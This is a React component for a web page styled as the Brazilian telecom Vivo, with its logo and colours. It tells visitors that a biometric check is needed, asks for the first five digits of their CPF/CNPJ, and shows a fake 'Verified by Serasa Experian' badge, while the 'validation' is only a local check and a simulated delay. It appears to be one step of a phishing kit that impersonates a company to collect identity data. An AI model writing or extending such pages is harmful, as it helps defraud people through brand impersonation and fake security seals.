
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { validatePartialCPF } from "@/utils/validation/cpfValidation";
import ReCAPTCHA from "react-google-recaptcha";
import Image from "@/components/ui/image";

interface CpfVerificationStepProps {
  onNext: () => void;
}

export const CpfVerificationStep = ({ onNext }: CpfVerificationStepProps) => {
  const [cpfDigits, setCpfDigits] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [captchaValue, setCaptchaValue] = useState<string | null>(null);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cpfDigits || cpfDigits.length < 5) {
      toast({
        title: "CPF inválido",
        description: "Por favor, insira os primeiros 5 dígitos do seu CPF/CNPJ.",
        variant: "destructive",
      });
      return;
    }

    if (!captchaValue) {
      toast({
        title: "Verificação necessária",
        description: "Por favor, complete a verificação reCAPTCHA.",
        variant: "destructive",
      });
      return;
    }
    
    try {
      setIsLoading(true);
      
      if (!validatePartialCPF(cpfDigits)) {
        throw new Error("Os dígitos do CPF não são válidos.");
      }
      
      await new Promise(resolve => setTimeout(resolve, 800));
      onNext();
    } catch (error: any) {
      toast({
        title: "Erro na verificação",
        description: error.message || "Ocorreu um erro ao verificar o CPF.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#8425af] text-white p-6">
      <div className="max-w-md mx-auto space-y-8">
        {/* Vivo Logo */}
        <div className="flex justify-center mb-12">
          <svg width="120" height="48" viewBox="0 0 120 48" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M60 24C60 37.2548 49.2548 48 36 48C22.7452 48 12 37.2548 12 24C12 10.7452 22.7452 0 36 0C49.2548 0 60 10.7452 60 24Z" fill="white"/>
            <path d="M108 24C108 37.2548 97.2548 48 84 48C70.7452 48 60 37.2548 60 24C60 10.7452 70.7452 0 84 0C97.2548 0 108 10.7452 108 24Z" fill="white"/>
          </svg>
        </div>

        <div className="text-center space-y-6">
          <h2 className="text-2xl font-light">
            Olá, verificamos que você está realizando a consulta/contratação dos nossos serviços VIVO. Para dar continuidade precisamos realizar a sua biometria.
          </h2>
          
          <p className="text-sm opacity-80">
            Biometria é uma solução que utiliza a tecnologia para identificação do cliente.
          </p>
        </div>
        
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label htmlFor="cpf" className="block text-lg font-medium text-center">
              Insira os primeiros 5 dígitos do seu CPF/CNPJ:
            </label>
            <Input
              id="cpf"
              type="text"
              value={cpfDigits}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 5);
                setCpfDigits(value);
              }}
              placeholder=""
              className="w-full h-12 text-black text-center text-lg bg-white"
              maxLength={5}
            />
          </div>

          {/* reCAPTCHA */}
          <div className="flex justify-center">
            <ReCAPTCHA
              sitekey="your-recaptcha-site-key"
              onChange={(value) => setCaptchaValue(value)}
              theme="light"
            />
          </div>

          {/* Serasa Experian Badge */}
          <div className="flex justify-center mt-8">
            <div className="flex items-center space-x-2">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="white" strokeWidth="2"/>
                <path d="M8 12L11 15L16 9" stroke="white" strokeWidth="2"/>
              </svg>
              <span className="text-sm text-white">Verified by</span>
              <span className="font-semibold text-sm text-white">Serasa Experian</span>
            </div>
          </div>
          
          <Button 
            type="submit"
            className="w-full h-12 bg-white text-[#8425af] hover:bg-gray-100 font-medium uppercase"
            disabled={isLoading || !captchaValue || cpfDigits.length < 5}
          >
            {isLoading ? "Validando..." : "Validar"}
          </Button>
        </form>
      </div>
    </div>
  );
};
